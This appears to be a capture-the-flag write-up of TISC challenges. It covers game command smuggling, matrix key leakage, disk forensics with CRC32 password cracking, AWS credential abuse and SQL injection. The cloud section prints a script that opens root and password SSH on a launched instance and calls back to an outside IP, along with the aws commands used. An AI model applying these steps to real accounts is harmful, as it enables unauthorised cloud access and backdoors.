Slay The Dragon
TISC
LEVEL 1
DESCRIPTION
Topic: Pwn

The recently launched online RPG game "Slay The Dragon" has been hot topic in the online gaming community of late, due to a seemingly impossible final boss. Amongst the multiple tirades against the forementioned boss, much controversy has been brewing due to rumors of the game being a recruitment campaign for PALINDROME, the cybercriminal organisation responsible for recent cyberattacks on Singapore's critical infrastructure.

You are tasked to find a way to beat (hack) the game and provide us with the flag (a string in the format TISC{xxx}) that would be displayed after beating the final boss. Your success is critical to ensure the safety of Singapore's cyberspace, as it would allow us to send more undercover operatives to infiltrate PALINDROME.

To aid in your efforts, we have managed to obtain the source code of the game for you. We look forward to your success!

You will be provided with the following:

1. Source code for game client/server (Python 3.10.x)
2. Game client executable (Compiled with PyInstaller)
- Highly recommended that you run it in a modern terminal (not cmd.exe) for the optimal experience:
- Windows: Windows Terminal or ConEmu recommended.
- Linux: the default terminal should be fine.

Note: If you'd like to make any modifications to the client, we'd strongly suggest modifying the source code and running it directly. The game client executable has been provided purely for your convenience in checking out the game.

After installing the requirements and connecting in, we are greeted with this main menu.
```
>> python -m poetry shell
>> python main.py --host chal00bq3ouweqtzva9xcobep6spl5m75fucey.ctf.sg --port 18261
```

We can fight the boss or mine gold, which can be used to shop for a sword (+3 ATTACK, 5 gold) and potions(1 gold). Basically, there are 3 bosses. The last boss is a boss with 100HP and 50 ATTACK, which can 1 hit us since we are capped at 10HP and 3 ATTACK. In order to obtain the flag, we need to kill the last boss.

![](Images/1-big-boss.png)

While looking through the source code, I notice that I can bypass the creeper encounter chance by changing the `CREEPER_ENCOUNTER_CHANCE` to 0 or by sending Command.WORK directly in `/src/client/event/workevent.py`. This helped me to get a sword and lots of potions in the initial testing phase.

![](Images/1-earn-gold-bypass.png)

In `/src/server/service/battleservice.py`, I notice that the battle outcome is computed by traversing a command history. The actions(ATTACK,HEAL,RUN) received from the client will be stored in the command history and parsed one by one.

![](Images/1-history-parsing.png)

Prior to that, whenever we send a Command.ATTACK or Command.HEAL, they will add in a Command.BOSS_ATTACK into the history. Only on Command.VALIDATE will we reach the compute_battle_outcome() function. This VALIDATE is sent when we kill the boss from the client-side and request validation from server side. This means that the commands we sent from client-side after killing the first 5HP monster will be `"ATTACK#ATTACK#ATTACK#ATTACK#ATTACK#VALIDATE#"` (With # as EOF and ignoring the Base64Encoding), and the commands logged in the server history will be `"ATTACK|BOSS_ATTACK|ATTACK|BOSS_ATTACK|ATTACK|BOSS_ATTACK|ATTACK|BOSS_ATTACK|ATTACK|BOSS_ATTACK|VALIDATE|"`.

After looking closely, I notice the vulnerable section in line 30. The match-case is checking `history.latest`, which is the latest command logged. These command comes from the history.log_commands_from_str() function.

![](Images/1-vulnerable-match-case.png)

Checking `/src/core/models/command.py`, this function can take in multiple commands, delimited by whitespace.

![](Images/1-command-whitespace.png)

As such, we can chain enough "ATTACK" before the EOF in a single command before the dragon can attack us. We can send in `"ATTACK ATTACK ATTACK ATTACK ATTACK..(x100)#VALIDATE#"` from client-side, which will be processed as `"ATTACK|ATTACK|ATTACK|ATTACK|ATTACK..(x100)|BOSS_ATTACK|VALIDATE|"`.

We modify our attack_boss() function in `/src/client/event/battlevent.py` to send out custom command:

![](Images/1-modify-1.png)

Modify our custom function in `/src/client/gameclient.py` to send "ATTACK ATTACK ATTACK ATTACK ATTACK.."

![](Images/1-modify-2.png)

Lastly, comment out the self.player.receive_attack_from(self.boss) in `/src/client/event/battlevent.py` to prevent our player from dying on client-side.

![](Images/1-modify-3.png)

Now, to slay the dragon.. By default, the dragon would have died on the first hit, which explains why the player remains at 10HP in the first 2 rounds. However, I did minimal modification on the client-side so I still need to slay the dragon on client-side despite it being already dead on server-side.

![](Images/1-dragon-slaying.png)

After hitting the keys for 34 times, I finally got the flag:

![](Images/1-flag.png)

```
Flag: TISC{L3T5_M33T_4G41N_1N_500_Y34R5_96eef57b46a6db572c08eef5f1924bc3}

Leaky Matrices
TISC
LEVEL 2
DESCRIPTION
Topic: Cryptography

Looks like PALINDROME implemented their own authentication protocol and cryptosystem to provide a secure handshake between any 2 services or devices. It does not look secure to us, can you take a look at what we have got?

Try to fool their authentication service: nc chal00bq3ouweqtzva9xcobep6spl5m75fucey.ctf.sg 56765

```

According to the white paper, the key verification is done using matrix multiplication, whereby  the response is the product of secret and challenge.

![](Images/2-matrix-multiplication.png)

Due to how matrix multiplication works, there is a flaw in this algorithm which we could leak the secret using the challenge. When only 1 value in the challenge matrix is set, we can leak the column of the secret depending on which is set. For example, setting the first challenge value allow us to leak the first secret column.

![](Images/2-leaky-calculation.png)

To prove this theory, we reconstruct the algorithm from the python script and display the secret.

```py
import sys
import numpy as np

def sysout(fstr):
    sys.stdout.write(fstr)
    sys.stdout.flush()
           
def prompt(fstr):
    guards = "=" * len(fstr)
    sysout(f"{guards}\n{fstr}\n{guards}\n")

def vectostr(v):
    return "".join(map(str, v.reshape(-1)))

def strtovec(s, rows=8, cols=1):
    return np.fromiter(list(s), dtype="int").reshape(rows, cols)

def win():
    print("You win!")

SECRET_KEY = np.round(np.random.rand(8,8)).astype("int")
print(SECRET_KEY)
if __name__ == "__main__":
    prompt("Challenge Me!")
    for i in range(8):
        input_vec = input(f"Challenge Me #{i+1:02} <-- ")
        assert len(input_vec) == 8
        assert input_vec.count("1") + input_vec.count("0") == 8
        input_vec = strtovec(input_vec)
        output_vec = (SECRET_KEY @ input_vec) & 1
        sysout(f"My Response --> {vectostr(output_vec)}\n")

    prompt("Challenge You!")
    for i in range(8):
        input_vec = np.round(np.random.rand(8,1)).astype("int")
        sysout(f"Challenge You #{i+1:02} -- > {vectostr(input_vec)}\n")
        test_vec = input(f"Your Response <-- ")
        assert len(test_vec) == 8
        assert test_vec.count("1") + test_vec.count("0") == 8
        test_vec = strtovec(test_vec)
        answer_vec = (SECRET_KEY @ input_vec) & 1
        assert (answer_vec == test_vec).all()

    prompt("All challenge passed :)")
    win()
```

As seen in the image below, I can leak out every column by taking advantage that the app challenge me 8 times, allowing me to get the full secret matrix.

![](Images/2-leaking.png)

Trying this on the server, I leak out the secret first.

![](Images/2-leaking-secret-key.png)

Then, I modify the local script to use the secret.

![](Images/2-modified-script.png)

Depending on what the server challenge me, I use the script to generate the response and use it back on the server.

TISC
LEVEL 3
DESCRIPTION
Topic: Forensics

Palindrome has spread some virus to corrupt machines causing incorrect readings in patients' health measurements and rending them unusable. Inspect the file and see if you can uncover the 8 corrupted bytes that renders the file system unusable?

Submit your flag in this format: TISC{last 4 bytes in 8 lowercase hex characters}

PATIENT0 - Part 2
TISC
LEVEL 3
DESCRIPTION
Topic: Forensics

Palindrome must have leaked one of their passwords as the 4 corrupted bytes (Part 1 flag)! Dig deeper to find what was hidden!

Submit your flag in this format: TISC{md5 hash} <-- will be prompted only after opening hidden room.

Note: Please ignore the word 'original' in clue 4.

AVAILABLE HINTS
```


I fix the NTFS header.

![](Images/3-fix-NTFS-header.png)

Using FTK Imager, I mount the image and found a broken.pdf and message.png.

![](Images/3-ftk-imager-brokenpdf-message.png)

message.png contains an Alternate Data Stream, $RAND. We extract all 3 files.

![](Images/3-ads.png)

broken.pdf show us a hint:

![](Images/3-broken-pdf.png)

Decoding the message.png show us a hint:

![](Images/3-message-hint.png)

Hint in $RAND:

![](Images/3-hint-in-rand.png)

Another hint in $RAND:

![](Images/3-hint-in-rand-2.png)

Together with the free hints: 
```
1. The BPB is broken, can you fix it?
2. Thirsty for the flag? Go find the stream.
3. Are these True random bytes for Cryptology?
4. If you need a password, the original reading of the BPB was actually Checked and ReChecked 32 times!
5. Find and interpret all 4 clues found from Part 1, which should help you to 'unlock the outer door'.
6. (TrueCrypt logo image)
7.  Clue 1 points to where the corrupted bytes (Part 1 flag) and password can be found. Use Part 1's flag as the password. Clue 2 points to where the encrypted data source is found. It is important to extract out ONLY the encrypted data and try to decrypt it, else it will fail. Clue 3 points to the software used to encrypt the data source. Clue 4 points to the algorithm used to produce the corrupted bytes (Part 1 flag) and the password. It will come in handy once you clear the outer door. Once you obtain Clue 1, 2 and 3 and their contents, you should be able to 'unlock the outer door'.
8. For those that cleared the 'outer door', i.e. found outer.jpg, figure out the algorithm described in Clue 4, and crack for the 'hidden room key'/password to match the 4 bytes found in Part 1, and apply it on the same encrypted data source again. That password should be 9 characters long and resembles an english word. The technique used to find the password should not take more than 1 hour.
```

I remove the hints from $RAND and open it with TrueCrypt, using password from flag 1.

![](Images/3-mounting-rand.png)

It contains this image:

![](Images/3-outer-hint.png)

With this hint, we can piece out that flag 1, `f76635ab`, is a CRC32 checksum with multiple keys. This make sense because CRC32 checksum is susceptible to hash collision, which matches the hint. As such, we are supposed to crack it and expect a key that resembles an english word.

Since the hint uses lowercase and numbers only, I use john and specify lowercase and numbers only to help us crack the password faster. Since there are multiple keys, I specify --keep-guessing to continue guessing even when one key is found.

```
>> vi crc32
user_x:$crc32$00000000.f76635ab:::dummy

>> john --fork=8 --format=crc32 --keep-guessing --incremental=LowerNum crc32
```

After around 30mins, I noticed a familiar english word `c01lis1on`.

![](Images/3-correct-key.png)

TrueCrypt allows partitioning using different passwords. As such, we can use the new password on the previous clean $RAND file.

![](Images/3-true-crypt-collision.png)

It contains a ppsm file.

![](Images/3-ppsm-file.png)

Opening it up we are greeted with this image and The Fray - You Found Me playing in the background.

![](Images/3-image-for-flag.png)

We can unzip ppsm file since it's basically a zip to obtain the md5 hash of the song!

```
>> unzip flag.ppsm -d flag 
>> md5sum flag/ppt/media/media1.mp3 
f9fc54d767edc937fc24f7827bf91cfe  flag/ppt/media/media1.mp3

4B - CloudyNekos
TISC
LEVEL 4
DESCRIPTION
Topic: Cloud

We have received intelligence that Palindrome has started a global computing infrastructure to be made available to its agent to spin up C2 instances. They relied on Cloud Service Providers like AWS to provide computing resources for its agents. They have their own custom built access system e-service portal that generate short-lived credentials for their agents to use their computing infrastructure. It was said that their access system e-service was diguised as a blog site.

We need your help to access their computing resources and exfiltrate any meaningful intelligence for us.

Start here: http://d20whnyjsgpc34.cloudfront.net

*NOTE*: Solving challenge 4B allows you to complete level 4, but unlocks challenge 5B only!
```

Accessing the site lead us to a "CATalog" page, which is a collection of cat images. Viewing the source, There is some value labelled as passcode as well as some comments on s3 bucket configuration.

![](Images/4b-cat-view-source.png)

Seems like this CloudFront site is using an s3 bucket called "palindromecloudynekos". Let me try to access the bucket.

```
>> aws s3 ls s3://palindromecloudynekos   
Unable to locate credentials. You can configure credentials by running "aws configure".
```

In order to configure the credentials, we need to create an AWS account to generate an access id and secret key. After doing so, we try to access the bucket again. Luckily, the bucket has no access restriction as long as the AWS account is valid. Inside, there is a notes.txt.

```
>> aws s3 ls s3://palindromecloudynekos

We download the notes.txt from the CloudFront site:

# Neko Access System Invocation Notes

Invoke with the passcode in the header "x-cat-header". The passcode is found on the cloudfront site, all lower caps and separated using underscore.

All EC2 computing instances should be tagged with the key: 'agent' and the value set to your username. Otherwise, the antivirus cleaner will wipe out the resources.
```

I set the header `X-Cat-Header: cats_rule_the_world` and send in a request. I obtained an Access Key and Secret Key.

The code.py script is as followed. This code will be executed on the AWS server side to create an Ubuntu ec2 instance. When the instance is created, the `init_script` will set-up the ssh service and account before calling my listening IP address, so that I will know the IP address of the newly created ec2 server.

```py
import boto3


ec2 = boto3.resource('ec2')

def lambda_handler(event, context):
	init_script = """#!/bin/bash
	sed 's/PasswordAuthentication no/PasswordAuthentication yes/' -i /etc/ssh/sshd_config 
	sed 's/#PermitRootLogin yes/PermitRootLogin yes/' -i /etc/ssh/sshd_config 
	systemctl restart sshd
	service sshd restart 
	echo -e "cloudynekos96\ncloudynekos96" | passwd ubuntu
	wget http://35.89.18.183/"""


	instance = ec2.create_instances(
		InstanceType = "t2.micro",
		ImageId = "ami-045caf2c5746a62df", #Ubuntu 22.04
		SubnetId = "subnet-0aa6ecdf900166741", #aws ec2 describe-subnets 
		MaxCount = 1,
		MinCount = 1,
		UserData = init_script,
		IamInstanceProfile = {'Name': 'ec2_agent_instance_profile'}, #aws iam list-instance-profiles
		SecurityGroupIds = [
			'sg-047c958320ee832f0'], #aws ec2 describe-security-groups
		TagSpecifications = [{
			'ResourceType': 'instance',
			'Tags': [{'Key': 'agent', 'Value': 'user-72cc762fc45d4be2908de1cecaa571ed'}] #aws sts get-caller-identity
			}]
	)

	return { 'Instance ID': instance[0].id}
```

In order to create a function, I need to append the user account path from `>> aws sts get-caller-identity`, and obtain the lambda_agent_development_role from `>> aws iam list-roles`. Uploading the code through zip helps to reduce the error generated. Do note that the `--function-name` has to be appended with the user name.

```
>> zip -g code.zip code.py

>> aws lambda create-function --function-name user-72cc762fc45d4be2908de1cecaa571ed-lambda_function --runtime python3.9 --role "arn:aws:iam::051751498533:role/lambda_agent_development_role" --handler code.lambda_handler --zip-file "fileb://code.zip"
```

Before invoking the function, I need to start a HTTP listener on our own AWS server, allowing TCP port 80 as well.

```
>> python3 -m http.server 80
```
I execute the function and receive output.txt.

```
>> aws lambda invoke --function-name "user-72cc762fc45d4be2908de1cecaa571ed-lambda_function" output.txt
{
    "StatusCode": 200,
    "ExecutedVersion": "$LATEST"
}

>> cat output.txt
{"Instance ID": "i-0f020924004e505a6"}
```
On my server end, I caught the request.

Now that I have the IP address of the server, I can use the credentials I created to ssh in to obtain the security credentials for the IAM role attached to the ec2 instance.

5B - PALINDROME's Secret
TISC
LEVEL 5
DESCRIPTION
Topic: Web Exploitation

We have discovered PALINDROME's secret portal, but we can't seem to gain access. Thankfully, we managed to steal the source code - can you take a look?

Gaining access to the portal and stealing the PALINDROME admin's access token will greatly aid our efforts to curb PALINDROME's ongoing attack.

*NOTE*: Solving this challenge unlocks level 6!

There is an SQL injection in the login page. Even though the query is parameterized, the inputs are not checked if they are a string before passing to the query. As such, we can submit an object instead to do a 1=1 injection.
